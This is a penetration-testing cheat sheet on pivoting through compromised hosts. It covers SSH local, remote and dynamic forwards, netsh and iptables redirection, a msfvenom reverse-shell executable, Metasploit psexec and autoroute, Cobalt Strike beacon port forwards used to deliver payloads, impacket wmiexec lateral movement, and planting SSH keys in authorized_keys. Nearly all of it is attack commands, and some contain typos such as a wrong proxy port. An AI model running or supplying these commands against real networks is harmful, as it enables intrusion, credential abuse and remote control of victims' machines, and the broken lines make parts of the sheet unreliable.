### Local Port Forward
```
ssh -NfL 4000:127.0.0.1:80 c2@192.168.199.107
SSH Login to 10.130.10.22 as we have SSH credential for 10.130.10.22
sh -L 7777:10.130.11.13:445 bgreen@10.130.10.22
use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 127.0.0.1
msf6 exploit(windows/smb/psexec) > set RPORT 7777
```

### Reverse Port Pivoting 
Web service running on the Ubuntu host, and you can access that service from the Kali box to establish a reverse SSH tunnel from the Ubuntu box.
```
ssh -Nf -R 7000:127.0.0.1:80 root@Kali IP Address
ssh -Nf -R 7000:127.0.0.1:80 root@192.168.199.104
```
### Reverse Port Pivoting With MSF
```
Compromised Host:10.100.11.101
C2 Host: 10.100.11.100
msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.100.11.101 LPORT=2222 -f exe -o Ninja.exe
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=Pivot Box connectport=Kali Port connectaddress=Kali
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=10.100.11.101 connectport=2222 connectaddress=10.100.11.100
```
### Dynamic Port Forwarding
Dynamic Port Forwarding is to establish SOCKS between the attacker box and the DMZ(compromise) box to gain access to the Internal network which is inaccessible to the attacker directly.
```
ssh -NfD  9050 root@192.168.199.105
Chang proxychains port
proxychains nmap -sV -Pn -sC -sT c 10.10.10.13
```
```
Setup a dynamic port foward over SSH using port 9999 .
SSH Login to 10.130.10.22 as we have SSH credential for 10.130.10.22
ssh -NfD 9999 bgreen@10.130.10.22
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.130.11.13
msf6 exploit(windows/smb/psexec) > set RPORT 445
msf6 exploit(windows/smb/psexec) > set Proxies socks4:127.0.0.1:999
```
### Window to VM Reverse Shell
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=1337 connectaddress=<Linux_VM_IP>
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=1010 connectaddress=192.168.199.104
netsh interface portproxy show v4tov4
107.10.64.102:8080

sudo iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination <Windows_VM_IP>:1337
sudo iptables -A FORWARD -p tcp -d <Windows_VM_IP> --dport 1337 -j ACCEPT

sudo apt install iptables-persistent -y  # For Debian/Ubuntu
sudo netfilter-persistent save
sudo nft list ruleset > /etc/nftables.conf
```

### Metasploit
```
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 9050
exploit -j
proxychains -q nmap -Pn -n -F -sT 192.168.1.1


run post/multi/manage/autoroute
set session 1
session => 1
set subnet 172.16.170.0/24
run
```
### Pivoting With Proxychains4
```
Compromised Box: 10.10.17.231
Team Server: 10.10.5.120
On Cobalt Strike Beacon:
rportfwd [bind port] [forward host] [forward port]
rportfwd 8080 10.10.5.120 80
iwr -Uri http://10.10.17.231:8080/a #now we can download the payload form victim
```
```
On Cobalt Strike Beacon: socks 9050
Chnaged team server IP: 10.10.10.127
sudo sed -i "s/socks4\s\+127.0.0.1\s\+9050/10.10.10.127 9050/g" /etc/proxychains4.conf
proxychains wmiexec.py Corp/John@10.10.10.199
```
### SSH Proxy
```
mkdir CA  
ssh-keygen -f id_rsa -t rsa -N ''
cat id_rsa.pub >> authorized_keys
cat id_rsa.pub >> ~/.ssh/authorized_keys
sshuttle -v -e "ssh -i /home/kali/Desktop/CA/id_rsa" -r c2@192.168.199.106 10.10.10.0/24
/usr/bin/impacket-wmiexec -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10

```
